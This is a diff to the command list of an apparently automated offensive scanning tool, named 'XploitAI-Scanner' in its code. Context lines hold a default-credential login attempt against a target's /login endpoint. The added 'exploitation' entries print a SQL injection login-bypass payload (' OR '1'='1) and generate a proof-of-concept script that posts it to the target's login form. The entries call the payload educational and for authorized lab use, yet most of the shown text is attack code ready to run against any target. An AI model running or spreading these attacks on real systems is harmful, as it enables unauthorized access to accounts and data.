@@ -84,6 +84,18 @@ COMMANDS = [
         "description": "Attempt default credentials on login endpoint.",
         "command_template": "python -c \"\nimport urllib.request, urllib.error, urllib.parse\nbase = '{target}'.rstrip('/')\ncreds = [('admin','admin'),('admin','password'),('admin','123456'),('root','root'),('administrator','admin')]\nprint('Default credential attempt: ' + base + '/login')\nfor user, pwd in creds:\n    data = urllib.parse.urlencode({'username': user, 'password': pwd}).encode()\n    try:\n        req = urllib.request.Request(base+'/login', data=data, headers={'User-Agent': 'XploitAI-Scanner/1.0', 'Content-Type': 'application/x-www-form-urlencoded'})\n        resp = urllib.request.urlopen(req, timeout=5)\n        body = resp.read(300).decode('utf-8', 'ignore')\n        if any(x in body.lower() for x in ['logout','dashboard','welcome','profile']):\n            print('  AUTH_SUCCESS: ' + user + ':' + pwd)\n        else:\n            print('  AUTH_FAIL: ' + user + ':' + pwd)\n        resp.close()\n    except urllib.error.HTTPError as e:\n        print('  [' + str(e.code) + '] ' + user + ':' + pwd)\n    except Exception as e:\n        print('  ERR: ' + str(e))\n\"",
     },
+    {
+        "phase_name": "exploitation",
+        "name": "PayloadGeneration",
+        "description": "Generate a safe demonstration payload and print usage guidance.",
+        "command_template": "python -c \"\nimport base64, json\nraw_payload = \\\"' OR '1'='1\\\"\npayload_items = [\n    ('type', 'demo_injection'),\n    ('vector', 'query_parameter'),\n    ('raw', raw_payload),\n    ('encoded', base64.b64encode(raw_payload.encode()).decode()),\n    ('note', 'Educational payload for authorized lab validation only.'),\n]\nprint('PAYLOAD_GENERATED')\nprint(json.dumps(payload_items))\n\"",
+    },
+    {
+        "phase_name": "exploitation",
+        "name": "ExploitScriptGeneration",
+        "description": "Generate a proof-of-concept exploit script in memory for operator review.",
+        "command_template": "python -c \"\nlines = [\n    '#!/usr/bin/env python3',\n    'import urllib.request',\n    'import urllib.parse',\n    '',\n    'target = \\\"{target}\\\".rstrip(\\\"/\\\")',\n    'post_data = urllib.parse.urlencode([(\\\"username\\\", \\\"\\\\\\' OR \\\\\\'1\\\\\\'=\\\\\\'1\\\"), (\\\"password\\\", \\\"test\\\")]).encode()',\n    'req = urllib.request.Request(target + \\\"/login\\\", data=post_data)',\n    'resp = urllib.request.urlopen(req, timeout=5)',\n    'print(\\\"status=\\\", resp.status)',\n    'print(resp.read(300).decode(\\\"utf-8\\\", \\\"ignore\\\"))',\n]\nprint('SCRIPT_GENERATED')\nprint('\\n'.join(lines))\n\"",
+    },
 
     # ── POST EXPLOITATION ─────────────────────────────────────────────────────
     {
